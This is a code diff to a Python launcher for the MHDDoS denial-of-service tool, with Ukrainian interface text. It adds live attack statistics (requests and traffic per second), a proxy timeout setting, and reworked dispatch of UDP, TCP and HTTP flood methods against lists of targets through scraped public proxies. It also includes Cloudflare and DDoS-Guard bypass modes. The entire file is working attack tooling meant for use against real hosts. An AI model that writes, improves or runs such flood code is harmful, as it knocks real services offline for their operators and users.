@@ -5,7 +5,7 @@ import socket
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from functools import lru_cache
 from multiprocessing import cpu_count
-from threading import Thread
+from threading import Thread, Lock
 from time import sleep, time
 
 import requests
@@ -13,7 +13,7 @@ from PyRoxy import Proxy
 from tabulate import tabulate
 from yarl import URL
 
-from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main
+from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main, Tools
 
 
 PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
@@ -32,6 +32,23 @@ def cls():
 @lru_cache(maxsize=128)
 def resolve_host(url):
     return socket.gethostbyname(URL(url).host)
+
+
+class AtomicCounter:
+    def __init__(self, initial=0):
+        self.value = initial
+        self._lock = Lock()
+
+    def __iadd__(self, value):
+        self.increment(value)
+        return self
+
+    def __int__(self):
+        return self.value
+
+    def increment(self, num=1):
+        with self._lock:
+            self.value += num
 
 
 class Targets:
@@ -79,7 +96,7 @@ def download_proxies():
         yield Proxy.fromString(line)
 
 
-def update_proxies(period, targets):
+def update_proxies(period, targets, proxy_timeout):
     #  Avoid parsing proxies too often when restart happens
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
@@ -101,7 +118,7 @@ def update_proxies(period, targets):
     with ThreadPoolExecutor(THREADS_PER_CORE) as executor:
         for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
             future_to_proxy.update({
-                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
+                executor.submit(proxy.check, target, proxy_timeout): proxy
                 for proxy in chunk
             })
 
@@ -126,51 +143,68 @@ def update_proxies(period, targets):
             wr.write(str(proxy) + '\n')
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode):
+def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout):
     threads_per_target = total_threads // len(targets)
     params_list = []
     proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
     for target in targets:
         ip = resolve_host(target)
+        target = URL(target)
         # UDP
-        if target.lower().startswith('udp://'):
-            params_list.append(['UDP', target, ip, UDP_THREADS, period])
+        if target.scheme == 'udp':
+            params_list.append((target, ip, 'UDP', UDP_THREADS, period))
 
         # TCP
-        elif target.lower().startswith('tcp://'):
-            params_list.append(['TCP', target, ip, threads_per_target, period, proxy_file])
+        elif target.scheme == 'tcp':
+            params_list.append((target, ip, 'TCP', threads_per_target, period, proxy_file))
 
         # HTTP(S)
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append([method, target, ip, threads, period, proxy_file, rpc])
+                params_list.append((target, ip, method, threads, period, proxy_file, rpc))
 
     logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
-    stats_output = []
+    statistics = {}
     for params in params_list:
-        Thread(target=mhddos_main, args=params, kwargs={'stats_output': stats_output}, daemon=True).start()
+        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
+        statistics[params] = thread_statistics
+        kwargs = {'statistics': thread_statistics, 'sock_timeout': proxy_timeout}
+        Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()
 
     ts = time()
-    while time() < ts + period:
-        sleep(2)
-        cls()
+    sleep(2)
+    while True:
+        passed = time() - ts
+        if passed > period:
+            break
 
         tabulate_text = []
-        for row in stats_output:
+        total_pps = 0
+        total_bps = 0
+        for k in statistics:
+            counters = statistics[k]
+            pps = int(int(counters['requests']) / passed)
+            total_pps += pps
+            bps = int(int(counters['bytes']) / passed)
+            total_bps += bps
             tabulate_text.append(
-                (f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6])
+                (f'{cl.WARNING}%s' % k[0].host, k[0].port, k[2], k[3], Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
             )
+        tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbytes(total_bps)}{cl.RESET}'))
+
+        cls()
         print_banner(vpn_mode)
+        print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
         print(tabulate(
             tabulate_text,
-            headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоків', 'PPS', 'BPS', f'Прогрес{cl.RESET}'],
+            headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
             tablefmt='fancy_grid'
         ))
-        stats_output.clear()
+        sleep(2)
 
 
-def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode):
+def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode):
     os.chdir('mhddos')
     for bypass in ('CFB', 'DGB'):
         if bypass in http_methods:
@@ -197,8 +231,8 @@ def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode):
 
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
-            update_proxies(period, targets)
-        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode )
+            update_proxies(period, targets, proxy_timeout)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -248,6 +282,12 @@ def init_argparse() -> argparse.ArgumentParser:
         choices=Methods.LAYER7_METHODS,
         help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
     )
+    parser.add_argument(
+        '--proxy-timeout',
+        type=float,
+        default=5,
+        help='How many seconds to wait for the proxy to make a connection.'
+    )
     # Deprecated
     parser.add_argument('--debug', action='store_true', help='DEPRECATED')
     parser.add_argument('--table', action='store_true', help='DEPRECATED')
@@ -272,6 +312,7 @@ if __name__ == '__main__':
         args.period,
         Targets(args.targets, args.config),
         args.rpc,
+        args.proxy_timeout,
         args.http_methods,
         args.vpn_mode,
     )
